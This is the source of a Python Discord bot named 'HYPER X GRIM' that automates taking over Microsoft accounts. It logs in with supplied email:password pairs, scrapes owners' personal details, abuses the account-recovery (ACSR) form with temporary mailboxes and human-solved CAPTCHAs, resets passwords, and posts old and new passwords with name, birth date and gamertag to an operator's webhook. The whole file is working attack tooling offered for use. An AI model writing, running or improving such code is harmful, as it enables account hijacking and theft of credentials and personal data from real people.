"""
HYPER X GRIM - DISCORD BOT
Complete automation using your existing modules
By: Advanced AI System
"""

import discord
from discord.ext import commands, tasks
from discord import app_commands
import asyncio
import json
import os
from datetime import datetime, timedelta
import random
import sys
from io import BytesIO
from PIL import Image
import threading
import traceback
from collections import deque

# ==================== ANIMATED EMOJIS ====================
E = {
    "ACCESS":    "<a:access:1454135488381190316>",
    "PREFIX":    "<a:prefix:1454136086862495918>",
    "CHANGE":    "<:change:1454137450954887180>",
    "ONE":       "<:one_one:1454137843898253332>",
    "TWO":      "<:2_:1437430618999881900>",
    "THREE":    "<:3_:1437430622699126794>",
    "FOUR":     "<:4_:1437430621852008519>",
    "THUNDER":  "<a:thunder_react:1445336405311094817>",
    "WARN":     "<a:WARN:1437415638103494819>",
    "ANNOUNCE": "<a:Announcement:1437430626906017833>",
    "MAIL":     "<a:mail:1454078802467749888>",
    "FREE":     "<a:Afree:1437415599138537564>",
    "COMBO":    "<:combo:1454079766822129675>",
    "FOLDER":   "<a:Folder:1437430624804667457>",
    "CLOCK":    "<a:clock_gif:1446068146736726159>",
    "AVATAR":   "<:avatar:1449681349685542923>",
    "TICK":     "<a:Tick_green:1437430636175425719>",
    "CROSS":    "<a:Cross:1437430620891644037>",
}

# Import your existing automation modules
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from automation.core import scrape_account_info
    from automation.acsr import submit_acsr_form
    from automation.acsr_continue import continue_acsr_flow
    from automation.reset_password import perform_password_reset
    from automation.captcha import download_captcha
    import tempmail
except ImportError as e:
    print(f"⚠️ Warning: Could not import automation modules: {e}")
    print("Make sure automation/, gui/, utils/ folders are in the same directory")

# ==================== CONFIGURATION ====================
ADMIN_ID = 1035564557143392307

# Anchor all file paths to the script directory to avoid PermissionError
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_FILE = os.path.join(BASE_DIR, "bot_config.json")
AUTHORIZED_USERS_FILE = os.path.join(BASE_DIR, "authorized_users.json")
ACTIVE_SESSIONS_FILE = os.path.join(BASE_DIR, "active_sessions.json")
STATS_FILE = os.path.join(BASE_DIR, "bot_stats.json")
QUEUE_FILE = os.path.join(BASE_DIR, "queue_data.json")

# Colors
COLOR_PRIMARY = 0x7B2CBF
COLOR_SUCCESS = 0x10B981
COLOR_ERROR = 0xEF4444
COLOR_WARNING = 0xF59E0B
COLOR_INFO = 0x3B82F6

# ==================== DATA MANAGER ====================
class BotDataManager:
    def __init__(self):
        self.config = self.load_json(CONFIG_FILE, {
            "webhook_url": "",
            "bot_enabled": True,
            "max_concurrent_users": 10
        })
        
        self.authorized_users = self.load_json(AUTHORIZED_USERS_FILE, {
            str(ADMIN_ID): {
                "authorized": True,
                "added_by": "system",
                "added_at": str(datetime.now())
            }
        })
        
        self.active_sessions = {}
        self.otp_data = {}
        self.processing_sessions = {}
        self.stats = self.load_json(STATS_FILE, {
            "total_processed": 0,
            "total_success": 0,
            "total_failed": 0,
            "users_served": {}
        })
    
    def load_json(self, filename, default):
        if os.path.exists(filename):
            try:
                with open(filename, 'r') as f:
                    return json.load(f)
            except:
                pass
        return default
    
    def save_json(self, filename, data):
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
    
    def save_config(self):
        self.save_json(CONFIG_FILE, self.config)
    
    def save_authorized_users(self):
        self.save_json(AUTHORIZED_USERS_FILE, self.authorized_users)
    
    def save_stats(self):
        self.save_json(STATS_FILE, self.stats)
    
    def is_authorized(self, user_id):
        return str(user_id) in self.authorized_users and self.authorized_users[str(user_id)]["authorized"]
    
    def authorize_user(self, user_id, by_admin):
        self.authorized_users[str(user_id)] = {
            "authorized": True,
            "added_by": str(by_admin),
            "added_at": str(datetime.now())
        }
        self.save_authorized_users()
    
    def revoke_user(self, user_id):
        if str(user_id) in self.authorized_users:
            del self.authorized_users[str(user_id)]
            self.save_authorized_users()
    
    def generate_otp(self, user_id):
        otp = ''.join([str(random.randint(0, 9)) for _ in range(6)])
        self.otp_data[user_id] = {
            "otp": otp,
            "expires": datetime.now() + timedelta(minutes=5),
            "attempts": 0
        }
        return otp
    
    def verify_otp(self, user_id, otp):
        if user_id not in self.otp_data:
            return False, "No OTP requested. Use `/request_otp` first."
        
        data = self.otp_data[user_id]
        
        if datetime.now() > data["expires"]:
            del self.otp_data[user_id]
            return False, "OTP expired. Request a new one."
        
        if data["attempts"] >= 3:
            del self.otp_data[user_id]
            return False, "Maximum attempts exceeded."
        
        if data["otp"] == otp:
            del self.otp_data[user_id]
            self.active_sessions[user_id] = {
                "authenticated": True,
                "auth_time": datetime.now()
            }
            return True, "Authentication successful!"
        else:
            data["attempts"] += 1
            return False, f"Invalid OTP. {3 - data['attempts']} attempts remaining."
    
    def is_authenticated(self, user_id):
        if user_id not in self.active_sessions:
            return False
        
        session = self.active_sessions[user_id]
        auth_time = session.get("auth_time")
        
        if isinstance(auth_time, str):
            auth_time = datetime.fromisoformat(auth_time)
        
        # Session expires after 24 hours
        if datetime.now() - auth_time > timedelta(hours=24):
            del self.active_sessions[user_id]
            return False
        
        return True
    
    def logout(self, user_id):
        if user_id in self.active_sessions:
            del self.active_sessions[user_id]
    
    def update_stats(self, user_id, success):
        # Migrate any old/incomplete stats file that is missing keys
        self.stats.setdefault("total_processed", 0)
        self.stats.setdefault("total_success", 0)
        self.stats.setdefault("total_failed", 0)
        self.stats.setdefault("users_served", {})

        self.stats["total_processed"] += 1
        if success:
            self.stats["total_success"] += 1
        else:
            self.stats["total_failed"] += 1

        user_str = str(user_id)
        if user_str not in self.stats["users_served"]:
            self.stats["users_served"][user_str] = {"processed": 0, "success": 0}

        self.stats["users_served"][user_str]["processed"] += 1
        if success:
            self.stats["users_served"][user_str]["success"] += 1

        self.save_stats()

# ==================== ACCOUNT QUEUE ====================
class AccountQueue:
    """FIFO queue for account processing requests."""

    def __init__(self):
        self._queue = deque()
        self._counter = 0  # monotonic position counter
        self._load()

    # ── persistence ──────────────────────────────────────
    def _load(self):
        if os.path.exists(QUEUE_FILE):
            try:
                with open(QUEUE_FILE, "r") as f:
                    items = json.load(f)
                for item in items:
                    self._queue.append(item)
                    self._counter = max(self._counter, item.get("position", 0))
            except Exception:
                pass

    def _save(self):
        with open(QUEUE_FILE, "w") as f:
            json.dump(list(self._queue), f, indent=2, default=str)

    # ── public API ───────────────────────────────────────
    def add(self, user_id, email, password, custom_password, channel_id):
        self._counter += 1
        entry = {
            "position": self._counter,
            "user_id": user_id,
            "email": email,
            "password": password,
            "custom_password": custom_password,
            "channel_id": channel_id,
            "added_at": str(datetime.now()),
        }
        self._queue.append(entry)
        self._save()
        return self._counter, len(self._queue)   # ticket, queue_len

    def get_next(self):
        """Pop and return the next entry, or None."""
        if self._queue:
            entry = self._queue.popleft()
            self._save()
            return entry
        return None

    def get_user_queue(self, user_id):
        return [e for e in self._queue if e["user_id"] == user_id]

    def remove_user(self, user_id):
        before = len(self._queue)
        self._queue = deque(e for e in self._queue if e["user_id"] != user_id)
        self._save()
        return before - len(self._queue)

    def clear(self):
        removed = len(self._queue)
        self._queue.clear()
        self._save()
        return removed

    @property
    def size(self):
        return len(self._queue)

# ==================== PASSWORD GENERATOR ====================
def generate_grim_password():
    """Generate HYPER X GRIM password format"""
    random_numbers = ''.join([str(random.randint(0, 9)) for _ in range(6)])
    return f"GRIMXHYPER{random_numbers}"

# ==================== BOT SETUP ====================
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
data_manager = BotDataManager()
account_queue = AccountQueue()

# ==================== QUEUE AUTO-PROCESSOR ====================
MAX_CONCURRENT = 3  # max simultaneous processing sessions

@tasks.loop(seconds=10)
async def queue_processor():
    """Background loop: auto-start queued accounts when slots are free."""
    active = len(data_manager.processing_sessions)
    if active >= MAX_CONCURRENT or account_queue.size == 0:
        return

    slots = MAX_CONCURRENT - active
    for _ in range(slots):
        entry = account_queue.get_next()
        if entry is None:
            break
        channel = bot.get_channel(entry["channel_id"])
        if channel is None:
            continue  # channel deleted / unavailable
        user_id = entry["user_id"]
        await channel.send(embed=create_embed(
            f"{E['THUNDER']} Queue → Processing",
            f"Your queued account `{entry['email']}` is now being processed!",
            COLOR_INFO
        ))
        asyncio.create_task(
            process_account_full(
                entry["email"], entry["password"],
                user_id, channel, entry.get("custom_password"),
            )
        )

@queue_processor.before_loop
async def before_queue_processor():
    await bot.wait_until_ready()

# ==================== HELPER FUNCTIONS ====================
def create_embed(title, description, color, fields=None):
    embed = discord.Embed(
        title=title,
        description=description,
        color=color,
        timestamp=datetime.now()
    )
    
    if fields:
        for field in fields:
            embed.add_field(
                name=field.get("name", "Field"),
                value=field.get("value", "No value"),
                inline=field.get("inline", False)
            )
    
    embed.set_footer(text="HYPER X GRIM • Password Changer Tool")
    return embed

async def send_to_webhook(result):
    """Send results to Discord webhook"""
    webhook_url = data_manager.config.get("webhook_url")
    if not webhook_url:
        print("⚠️ No webhook URL configured")
        return
    
    webhook_data = {
        "embeds": [{
            "title": "✅ Password Changed Successfully",
            "color": COLOR_SUCCESS,
            "fields": [
                {"name": "<a:mail:1454078802467749888> Email", "value": f"`{result['email']}`", "inline": False},
                {"name": "<:change:1454137450954887180> Old Password", "value": f"`{result['old_password']}`", "inline": True},
                {"name": "<:change:1454137450954887180> New Password", "value": f"`{result['new_password']}`", "inline": True},
                {"name": "<:avatar:1449681349685542923> Name", "value": result.get('name', 'N/A'), "inline": True},
                {"name": "<a:Folder:1437430624804667457> DOB", "value": result.get('dob', 'N/A'), "inline": True},
                {"name": "<a:Folder:1437430624804667457> Region", "value": result.get('region', 'N/A'), "inline": True},
                {"name": "<a:mail:1454078802467749888> Skype ID", "value": result.get('skype_id', 'N/A'), "inline": True},
                {"name": "<a:mail:1454078802467749888> Skype Email", "value": result.get('skype_email', 'N/A'), "inline": True},
                {"name": "<a:thunder_react:1445336405311094817> Xbox Gamertag", "value": result.get('gamertag', 'N/A'), "inline": True}
            ],
            "footer": {"text": f"Processed by User ID: {result.get('user_id', 'Unknown')}"},
            "timestamp": datetime.now().isoformat()
        }]
    }
    
    import aiohttp
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(webhook_url, json=webhook_data) as resp:
                if resp.status == 204:
                    print(f"✅ Webhook sent for {result['email']}")
                else:
                    print(f"⚠️ Webhook failed: {resp.status}")
    except Exception as e:
        print(f"❌ Webhook error: {e}")

# ==================== ACCOUNT PROCESSING ====================
async def process_account_full(email, password, user_id, channel, custom_password=None):
    """Complete account processing with all steps"""
    try:
        # Step 1: Scrape account info
        await channel.send(embed=create_embed(
            "<a:access:1454135488381190316> Step 1/5: Scraping Account Info",
            f"Logging into `{email}` to gather account details...",
            COLOR_INFO
        ))
        
        print(f"\n{'='*60}")
        print(f"Processing: {email}")
        print(f"User ID: {user_id}")
        print(f"{'='*60}\n")
        
        loop = asyncio.get_event_loop()

        # ── Live login progress ───────────────────────────────────────────────
        login_lines = []

        def build_login_embed(done=False):
            visible = login_lines[-15:]
            body = "\n".join(f"`{l}`" for l in visible) if visible else "*Connecting to Microsoft...*"
            embed = discord.Embed(
                title="<a:Tick_green:1437430636175425719> Login Complete!" if done else "<a:access:1454135488381190316> Step 1/5: Live Login Progress",
                description=body, color=COLOR_SUCCESS if done else COLOR_INFO,
                timestamp=datetime.now()
            )
            embed.set_footer(text=f"HYPER X GRIM • {email}")
            return embed

        login_progress_msg = await channel.send(embed=build_login_embed())
        login_queue = asyncio.Queue()

        def on_login_progress(msg):
            print(msg)
            loop.call_soon_threadsafe(login_queue.put_nowait, msg)

        async def login_updater():
            while True:
                msg = await login_queue.get()
                if msg is None:
                    break
                login_lines.append(msg)
                try:
                    await login_progress_msg.edit(embed=build_login_embed())
                except Exception:
                    pass

        login_task = asyncio.create_task(login_updater())

        # Run in executor to avoid blocking
        account_info = await loop.run_in_executor(None, scrape_account_info, email, password, on_login_progress)

        await login_queue.put(None)
        await login_task
        try:
            await login_progress_msg.edit(embed=build_login_embed(done=True))
        except Exception:
            pass
        
        if not account_info or account_info.get("error"):
            error_msg = account_info.get("error", "Could not login") if account_info else "Could not login"
            await channel.send(embed=create_embed(
                "<a:Cross:1437430620891644037> Login Failed",
                f"**Error:** {error_msg}\n**Account:** `{email}`",
                COLOR_ERROR
            ))
            data_manager.update_stats(user_id, False)
            return {"status": "failed", "error": error_msg}
        
        print(f"✅ Account info scraped successfully")
        
        # Step 2: Submit ACSR form
        await channel.send(embed=create_embed(
            "<:change:1454137450954887180> Step 2/5: Submitting ACSR Form",
            f"✅ Scraped: **{account_info.get('name', 'Unknown')}**\n\nGenerating temp email and submitting recovery form...",
            COLOR_INFO
        ))
        
        captcha_image, driver, token, temp_email = await loop.run_in_executor(
            None, submit_acsr_form, account_info
        )
        
        if not captcha_image or not driver:
            await channel.send(embed=create_embed(
                "<a:Cross:1437430620891644037> ACSR Submission Failed",
                "Could not submit the ACSR form.",
                COLOR_ERROR
            ))
            data_manager.update_stats(user_id, False)
            return {"status": "failed", "error": "ACSR submission failed"}
        
        print(f"✅ ACSR form submitted, temp email: {temp_email}")
        
        # Step 3: Send CAPTCHA
        captcha_filename = os.path.join(BASE_DIR, f"captcha_{user_id}_{int(datetime.now().timestamp())}.png")
        captcha_image.seek(0)
        with open(captcha_filename, "wb") as f:
            f.write(captcha_image.read())
        
        data_manager.processing_sessions[user_id] = {
            "driver": driver,
            "token": token,
            "temp_email": temp_email,
            "account_info": account_info,
            "email": email,
            "password": password,
            "custom_password": custom_password,
            "captcha_file": captcha_filename,
            "captcha_attempts": 0,
            "channel_id": channel.id,
            "start_time": datetime.now()
        }
        
        await channel.send(
            embed=create_embed(
                "<:combo:1454079766822129675> Step 3/5: CAPTCHA Required",
                "**Please solve the CAPTCHA below!**\n\nUse: `/submit_captcha <text>`",
                COLOR_WARNING,
                [
                    {"name": "<a:clock_gif:1446068146736726159> Timeout", "value": "5 minutes", "inline": True},
                    {"name": "<a:prefix:1454136086862495918> Attempts", "value": "3 maximum", "inline": True}
                ]
            ),
            file=discord.File(captcha_filename)
        )
        
        print(f"⏳ Waiting for CAPTCHA solution...")
        return {"status": "captcha_pending"}
        
    except Exception as e:
        print(f"❌ Error in process_account_full: {str(e)}")
        traceback.print_exc()
        
        await channel.send(embed=create_embed(
            "<a:Cross:1437430620891644037> Processing Error",
            f"**Error:** {str(e)}",
            COLOR_ERROR
        ))
        data_manager.update_stats(user_id, False)
        return {"status": "failed", "error": str(e)}

async def continue_after_captcha(user_id, captcha_text, interaction):
    """Continue processing after CAPTCHA submission"""
    if user_id not in data_manager.processing_sessions:
        await interaction.response.send_message(
            embed=create_embed("<a:Cross:1437430620891644037> No Session", "No active CAPTCHA session found.", COLOR_ERROR),
            ephemeral=True
        )
        return

    session = data_manager.processing_sessions[user_id]
    driver = session["driver"]
    token = session["token"]
    account_info = session["account_info"]
    email = session["email"]
    password = session["password"]

    channel = bot.get_channel(session["channel_id"])

    try:
        await interaction.response.defer(ephemeral=True)

        # ── Live progress embed ───────────────────────────────────────────────
        log_lines = []

        def build_progress_embed(done=False):
            visible = log_lines[-20:]          # keep last 20 lines visible
            body = "\n".join(f"`{l}`" for l in visible) if visible else "*Starting...*"
            title = "<a:Tick_green:1437430636175425719> ACSR Complete!" if done else "<a:prefix:1454136086862495918> Step 4/5: Live ACSR Progress"
            color = COLOR_SUCCESS if done else COLOR_INFO
            embed = discord.Embed(title=title, description=body, color=color, timestamp=datetime.now())
            embed.set_footer(text=f"HYPER X GRIM • {email}")
            return embed

        progress_msg = await channel.send(embed=build_progress_embed())

        # Queue that the worker thread writes into, the async side reads from
        progress_queue = asyncio.Queue()
        loop = asyncio.get_event_loop()

        # Thread-safe callback — called from inside run_in_executor thread
        def on_progress(msg):
            print(msg)
            loop.call_soon_threadsafe(progress_queue.put_nowait, msg)

        # Background task: read queue and edit the embed in real-time
        async def live_updater():
            while True:
                msg = await progress_queue.get()
                if msg is None:          # sentinel — stop
                    break
                log_lines.append(msg)
                try:
                    await progress_msg.edit(embed=build_progress_embed())
                except Exception:
                    pass

        updater_task = asyncio.create_task(live_updater())

        print(f"\n🔐 Submitting CAPTCHA: {captcha_text}")

        reset_link = await loop.run_in_executor(
            None, continue_acsr_flow, driver, account_info, token, captcha_text, user_id, on_progress
        )

        # Stop the live updater
        await progress_queue.put(None)
        await updater_task

        # Final embed edit to mark completion / error
        try:
            await progress_msg.edit(embed=build_progress_embed(done=(reset_link and not reset_link.startswith("ERROR"))))
        except Exception:
            pass
        
        # Handle CAPTCHA retry
        if reset_link == "CAPTCHA_RETRY_NEEDED":
            session["captcha_attempts"] += 1
            
            if session["captcha_attempts"] >= 3:
                await channel.send(embed=create_embed(
                    "<a:Cross:1437430620891644037> Maximum CAPTCHA Attempts",
                    "You've used all 3 attempts. Please start over with `/process`.",
                    COLOR_ERROR
                ))
                await interaction.followup.send(
                    embed=create_embed("<a:Cross:1437430620891644037> Failed", "Max CAPTCHA attempts reached.", COLOR_ERROR),
                    ephemeral=True
                )
                
                driver.quit()
                if os.path.exists(session["captcha_file"]):
                    os.remove(session["captcha_file"])
                del data_manager.processing_sessions[user_id]
                data_manager.update_stats(user_id, False)
                return
            
            # Get new CAPTCHA
            print(f"❌ CAPTCHA incorrect, downloading new one...")
            new_captcha = await loop.run_in_executor(None, download_captcha, driver)
            new_captcha_filename = os.path.join(BASE_DIR, f"captcha_{user_id}_{int(datetime.now().timestamp())}.png")
            new_captcha.seek(0)
            with open(new_captcha_filename, "wb") as f:
                f.write(new_captcha.read())
            
            if os.path.exists(session["captcha_file"]):
                os.remove(session["captcha_file"])
            session["captcha_file"] = new_captcha_filename
            
            await channel.send(
                embed=create_embed(
                    "<a:Cross:1437430620891644037> Wrong CAPTCHA",
                    f"Attempts remaining: **{3 - session['captcha_attempts']}**\n\nPlease try again.",
                    COLOR_WARNING
                ),
                file=discord.File(new_captcha_filename)
            )
            await interaction.followup.send(
                embed=create_embed("<a:Cross:1437430620891644037> Try Again", "CAPTCHA was incorrect.", COLOR_WARNING),
                ephemeral=True
            )
            return
        
        if not reset_link or reset_link.startswith("ERROR"):
            await channel.send(embed=create_embed(
                "<a:Cross:1437430620891644037> ACSR Failed",
                f"Could not complete recovery: {reset_link}",
                COLOR_ERROR
            ))
            await interaction.followup.send(
                embed=create_embed("<a:Cross:1437430620891644037> Failed", f"ACSR error: {reset_link}", COLOR_ERROR),
                ephemeral=True
            )
            
            driver.quit()
            if os.path.exists(session["captcha_file"]):
                os.remove(session["captcha_file"])
            del data_manager.processing_sessions[user_id]
            data_manager.update_stats(user_id, False)
            return
        
        print(f"✅ Reset link received")
        
        # Step 5: Reset password
        new_password = session.get("custom_password") or generate_grim_password()
        await channel.send(embed=create_embed(
            "<:change:1454137450954887180> Step 5/5: Resetting Password",
            f"Opening reset link and changing password to `{new_password}`...",
            COLOR_INFO
        ))
        print(f"🔑 New password: {new_password}")
        
        actual_password = await loop.run_in_executor(
            None, perform_password_reset, reset_link, email, new_password
        )
        
        if not actual_password:
            await channel.send(embed=create_embed(
                "<a:Cross:1437430620891644037> Password Reset Failed",
                "Could not change the password. Please try again.",
                COLOR_ERROR
            ))
            await interaction.followup.send(
                embed=create_embed("<a:Cross:1437430620891644037> Failed", "Password reset failed.", COLOR_ERROR),
                ephemeral=True
            )
            
            driver.quit()
            if os.path.exists(session["captcha_file"]):
                os.remove(session["captcha_file"])
            del data_manager.processing_sessions[user_id]
            data_manager.update_stats(user_id, False)
            return
        
        print(f"✅ Password changed successfully to: {actual_password}")
        
        # Success!
        result = {
            "email": email,
            "old_password": password,
            "new_password": actual_password,
            "name": account_info.get("name"),
            "dob": account_info.get("dob"),
            "region": account_info.get("region"),
            "skype_id": account_info.get("skype_id"),
            "skype_email": account_info.get("skype_email"),
            "gamertag": account_info.get("gamertag"),
            "user_id": user_id
        }
        
        await send_to_webhook(result)
        data_manager.update_stats(user_id, True)
        
        await channel.send(embed=create_embed(
            "<a:Tick_green:1437430636175425719> SUCCESS! Password Changed!",
            f"**Account:** `{email}`",
            COLOR_SUCCESS,
            [
                {"name": "<:change:1454137450954887180> Old Password", "value": f"`{password}`", "inline": True},
                {"name": "<:change:1454137450954887180> New Password", "value": f"`{actual_password}`", "inline": True},
                {"name": "<a:Folder:1437430624804667457> Full Details", "value": "Sent to webhook!", "inline": False}
            ]
        ))
        
        await interaction.followup.send(
            embed=create_embed(
                "<a:Tick_green:1437430636175425719> Complete!",
                f"Password changed for `{email}`\n\n**New Password:** `{actual_password}`",
                COLOR_SUCCESS
            ),
            ephemeral=True
        )
        
        print(f"\n{'='*60}")
        print(f"✅ COMPLETED: {email}")
        print(f"{'='*60}\n")
        
        # Cleanup
        driver.quit()
        if os.path.exists(session["captcha_file"]):
            os.remove(session["captcha_file"])
        del data_manager.processing_sessions[user_id]
        
    except Exception as e:
        print(f"❌ Error in continue_after_captcha: {str(e)}")
        traceback.print_exc()
        
        await channel.send(embed=create_embed(
            "<a:Cross:1437430620891644037> Error",
            f"**Error:** {str(e)}",
            COLOR_ERROR
        ))
        await interaction.followup.send(
            embed=create_embed("<a:Cross:1437430620891644037> Error", f"Error: {str(e)}", COLOR_ERROR),
            ephemeral=True
        )
        
        try:
            driver.quit()
        except:
            pass
        if os.path.exists(session.get("captcha_file", "")):
            try:
                os.remove(session["captcha_file"])
            except:
                pass
        if user_id in data_manager.processing_sessions:
            del data_manager.processing_sessions[user_id]
        data_manager.update_stats(user_id, False)

# ==================== BOT EVENTS ====================
@bot.event
async def on_ready():
    print(f"\n╔{'═'*70}╗")
    print(f"║{'':^70}║")
    print(f"║{'  ██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗  ██████╗ ██████╗ ██████╗ ':^70}║")
    print(f"║{'  ██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔════╝██╔═══██╗██╔══██╗':^70}║")
    print(f"║{'  ███████║ ╚████╔╝ ██████╔╝█████╗  ██████╔╝██║     ██║   ██║██████╔╝':^70}║")
    print(f"║{'  ██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗██║     ██║   ██║██╔══██╗':^70}║")
    print(f"║{'  ██║  ██║   ██║   ██║     ███████╗██║  ██║╚██████╗╚██████╔╝██║  ██║':^70}║")
    print(f"║{'  ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝':^70}║")
    print(f"║{'':^70}║")
    print(f"║{'  HYPER X GRIM  ◈  ONLINE':^70}║")
    print(f"╚{'═'*70}╝")
    print(f"\n✅ Bot User: {bot.user.name}")
    print(f"✅ Bot ID: {bot.user.id}")
    print(f"✅ Admin ID: {ADMIN_ID}")
    print(f"✅ Authorized Users: {len(data_manager.authorized_users)}")
    print(f"✅ Webhook: {'✓ Configured' if data_manager.config.get('webhook_url') else '✗ Not Set'}")
    print(f"\n{'='*70}\n")
    
    try:
        synced = await bot.tree.sync()
        print(f"✅ Synced {len(synced)} slash commands")
    except Exception as e:
        print(f"❌ Error syncing commands: {e}")
    
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name="HYPER X GRIM | /help"
        )
    )
    
    # Start the queue auto-processor
    if not queue_processor.is_running():
        queue_processor.start()
        print(f"✅ Queue processor started (max {MAX_CONCURRENT} concurrent)")

    print(f"\n{'='*70}")
    print(f"Bot is ready! Use /help in Discord to see commands.")
    print(f"{'='*70}\n")

# ==================== DECORATORS ====================
def check_auth():
    async def predicate(interaction: discord.Interaction) -> bool:
        if not data_manager.is_authorized(interaction.user.id):
            await interaction.response.send_message(
                embed=create_embed("<a:Cross:1437430620891644037> Not Authorized", f"Contact admin (ID: `{ADMIN_ID}`).", COLOR_ERROR),
                ephemeral=True
            )
            return False
        return True
    return app_commands.check(predicate)

def check_login():
    async def predicate(interaction: discord.Interaction) -> bool:
        if not data_manager.is_authenticated(interaction.user.id):
            await interaction.response.send_message(
                embed=create_embed("<a:Cross:1437430620891644037> Not Logged In", "Use `/request_otp` and `/verify_otp` first.", COLOR_ERROR),
                ephemeral=True
            )
            return False
        return True
    return app_commands.check(predicate)

# ==================== COMMANDS ====================

@bot.tree.command(name="help", description="View all commands and how to use the bot")
async def help_command(interaction: discord.Interaction):
    if not data_manager.is_authorized(interaction.user.id):
        await interaction.response.send_message(
            embed=create_embed("<a:Cross:1437430620891644037> Not Authorized", f"Contact admin (ID: `{ADMIN_ID}`).", COLOR_ERROR),
            ephemeral=True
        )
        return
    
    embed = discord.Embed(
        title="<a:thunder_react:1445336405311094817> HYPER X GRIM",
        description="**Full ACSR Automation** — by HYPER X GRIM",
        color=COLOR_PRIMARY
    )
    
    embed.add_field(
        name="<a:access:1454135488381190316> Authentication",
        value=(
            "`/request_otp` - Get 6-digit code in DM\n"
            "`/verify_otp <code>` - Login with OTP\n"
            "`/logout` - End your session"
        ),
        inline=False
    )
    
    embed.add_field(
        name="<a:prefix:1454136086862495918> Processing",
        value=(
            "`/process <email:pass> [new_password]` - Start processing\n"
            "`/submit_captcha <text>` - Solve CAPTCHA\n"
            "`/status` - Check your session\n"
            "`/cancel` - Cancel current process"
        ),
        inline=False
    )
    
    if interaction.user.id == ADMIN_ID:
        embed.add_field(
            name="<a:access:1454135488381190316> Admin Commands",
            value=(
                "`/admin` - Admin panel\n"
                "`/authorize @user` - Grant access\n"
                "`/revoke @user` - Remove access\n"
                "`/list_users` - View all users\n"
                "`/set_webhook <url>` - Set webhook\n"
                "`/stats` - View statistics"
            ),
            inline=False
        )
    
    embed.add_field(
        name="<a:Announcement:1437430626906017833> Quick Start",
        value=(
            "<:one_one:1454137843898253332> `/request_otp` → Get code in DM\n"
            "<:2_:1437430618999881900> `/verify_otp <code>` → Authenticate\n"
            "<:3_:1437430622699126794> `/process email:pass MyNewPass` → Start ACSR\n"
            "<:4_:1437430621852008519> Bot shows CAPTCHA → Solve it\n"
            "5️⃣ `/submit_captcha <text>` → Continue\n"
            "6️⃣ ✅ Password changed automatically!"
        ),
        inline=False
    )
    
    embed.set_footer(text="HYPER X GRIM • Full Automation System")
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="request_otp", description="Request an OTP code for secure login")
@check_auth()
async def request_otp(interaction: discord.Interaction):
    user_id = interaction.user.id
    
    if data_manager.is_authenticated(user_id):
        await interaction.response.send_message(
            embed=create_embed("<a:WARN:1437415638103494819> Already Logged In", "You are already authenticated.", COLOR_INFO),
            ephemeral=True
        )
        return
    
    otp = data_manager.generate_otp(user_id)
    
    try:
        dm_embed = create_embed(
            "<a:access:1454135488381190316> Your One-Time Password (OTP)",
            f"Your OTP is: **`{otp}`**\n\nThis code expires in **5 minutes**.\nUse `/verify_otp {otp}` in the server.",
            COLOR_WARNING
        )
        await interaction.user.send(embed=dm_embed)
        
        await interaction.response.send_message(
            embed=create_embed("<a:Tick_green:1437430636175425719> OTP Sent", "Check your direct messages for the code.", COLOR_SUCCESS),
            ephemeral=True
        )
    except discord.Forbidden:
        await interaction.response.send_message(
            embed=create_embed("<a:Cross:1437430620891644037> DM Failed", "Enable DMs from server members.", COLOR_ERROR),
            ephemeral=True
        )

@bot.tree.command(name="verify_otp", description="Verify the OTP to log in")
@app_commands.describe(code="The 6-digit OTP from your DMs")
@check_auth()
async def verify_otp(interaction: discord.Interaction, code: str):
    user_id = interaction.user.id
    
    success, message = data_manager.verify_otp(user_id, code.strip())
    
    if success:
        await interaction.response.send_message(
            embed=create_embed("<a:Tick_green:1437430636175425719> Authentication Success", f"{message}\n\nYou can now use `/process` to change passwords!", COLOR_SUCCESS)
        )
    else:
        await interaction.response.send_message(
            embed=create_embed("<a:Cross:1437430620891644037> Authentication Failed", message, COLOR_ERROR),
            ephemeral=True
        )

@bot.tree.command(name="logout", description="End your current session")
@check_login()
async def logout_command(interaction: discord.Interaction):
    data_manager.logout(interaction.user.id)
    await interaction.response.send_message(
        embed=create_embed("<:avatar:1449681349685542923> Logged Out", "Your session has been ended. Use `/request_otp` to login again.", COLOR_INFO)
    )

@bot.tree.command(name="process", description="Start processing an account")
@app_commands.describe(
    account="Format: email:password (e.g., test@outlook.com:MyPass123)",
    new_password="New password to set (leave blank for auto-generated HYPER X GRIM password)"
)
@check_login()
async def process_account(interaction: discord.Interaction, account: str, new_password: str = ""):
    user_id = interaction.user.id
    
    if ":" not in account:
        await interaction.response.send_message(
            embed=create_embed("<a:Cross:1437430620891644037> Invalid Format", "Use: `email:password`", COLOR_ERROR),
            ephemeral=True
        )
        return
    
    email, password = account.split(":", 1)
    email = email.strip()
    password = password.strip()

    # Determine final new password
    final_new_password = new_password.strip() if new_password.strip() else generate_grim_password()

    if user_id in data_manager.processing_sessions:
        await interaction.response.send_message(
            embed=create_embed("<a:Cross:1437430620891644037> Session Active", "Complete or cancel your current process first. Use `/cancel`.", COLOR_WARNING),
            ephemeral=True
        )
        return
    
    await interaction.response.send_message(
        embed=create_embed(
            "<a:thunder_react:1445336405311094817> Starting Process",
            f"Attempting to recover: `{email}`\n\n🔒 **New Password:** `{final_new_password}`\n\nUpdates will be posted in this channel.",
            COLOR_INFO
        )
    )
    
    asyncio.create_task(process_account_full(email, password, user_id, interaction.channel, final_new_password))

@bot.tree.command(name="submit_captcha", description="Submit the CAPTCHA solution")
@app_commands.describe(text="The text shown in the CAPTCHA image")
@check_login()
async def submit_captcha(interaction: discord.Interaction, text: str):
    user_id = interaction.user.id
    
    if user_id not in data_manager.processing_sessions:
        await interaction.response.send_message(
            embed=create_embed("<a:Cross:1437430620891644037> No CAPTCHA Active", "No active CAPTCHA session.", COLOR_WARNING),
            ephemeral=True
        )
        return

    await continue_after_captcha(user_id, text.strip(), interaction)

